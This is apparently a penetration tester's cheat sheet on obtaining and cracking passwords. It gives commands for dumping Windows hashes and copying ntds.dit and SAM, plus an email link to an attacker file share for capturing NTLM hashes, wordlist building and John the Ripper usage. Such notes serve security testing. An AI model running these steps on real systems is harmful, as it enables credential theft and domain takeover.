---
title: Obtaining and Cracking Passwords
category: Post-Exploitation
order: 6
---

> **Windows** 

Metasploit Key logger for passwords | keyscan_start, keyscan_stop, keyscan_dump
PwDump | Pwdump drops files to disk and caught by AV <br> http://www.tarasco.org/security/pwdump_7/
Fgdump | fgdump drops files to disk and caught by AV <br> Source available to evade AV <br> http://foofus.net/goons/fizzgig/fgdump/downloads.htm#previous-version
Metasploit hashdump | meterpreter > hashdump (from memory) <br> meterpreter > run hashdump (hash and syskey from registry)
Mimikatz |  https://www.offensive-security.com/metasploit-unleashed/Mimikatz/ <br> https://www.christophertruncer.com/golden-ticket-generation/ <br> http://blog.opensecurityresearch.com/2012/06/using-mimikatz-to-dump-passwords.html <br> http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html
Volume Shadow Copy Service (domain controller) |  Obtain from : <br> https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs <br> https://github.com/MarkBaggett/MarkBaggett/blob/master/vssown.py  <br> <code> > cscript vssown.vbs /status or /start or /create /c <br> > copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit ntdsbackup.dit <br> > copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM systembackup.bak <br> > copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM sambackup.bak <br> Analyze with http://csabarta.com/downloads/ntds_dump_hash.zip
Sniff (Kannan, ntlm, ms kerberos) | E-mail with link: <br> file://[AttackerIP]/[AttackerShare] <br> Sniff the traffic between victim and client for challenge and response"

> **Linux**

/etc/passwd and /etc/shadow

> **Password Lists**

Password Lists in Kali | /usr/share/wordlists/
Tailor Password list to policy | <code> > pw-inspector [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p â€“s  <br> > pw-inspector -i /usr/share/wordlists/nmap.lst -o /root/passes.txt -m 6 -M 1 </code>
Combine Word Lists | <code> > cat wordlist.txt <wordlist2.txt....> | sort | uniq > dictionary.txt </code>
Word List from Website | <code> > mkdir /tmp/source <br> > cd /tmp/source <br> > wget -r -l [Page Depth] [target_website] <br> > cd .. <br> grep -h -r """" source | tr '[:space:]' '\n' | sort | uniq >wordlist.lst <br> > grep -v '<' wordlist.lst > newlist.lst </code>
Password Lists | https://downloads.skullsecurity.org/passwords/

> **Tools**

Rainbow Tables | Ophcrack <br> http://project-rainbowcrack.com <br> http://souceforce.net/projects/ophcrack <br> http://lasecwww.epfl.ch/~oechslin/projects/ophcrack
GPU | MD5 Cracker: http://bvernoux.free.fr/md5/index.php <br> oclHashcat  and Hashcat (same project) <br> CUDA-multiforcer <br> aircrack-ng-CUDA <br> pyrit (WPA and WPA w/ CoWPAtty)
CPU | John and Cain

>**John**

View Cracked Passwords | ./john --show [password file]
Pause a session | CTRL-C
Kill a session | CTRL-C twice quickly
Restore a session | ./john --restore
Current Status | any key
Customize Session based on password policy (e.g., length) | edit john.conf (Linux) and john.ini (windows)
Combine Shadow and passwd | ./unshadow passwd_copy shadow_copy > combined.txt
Password length - Customization | MinLen and MaxLen



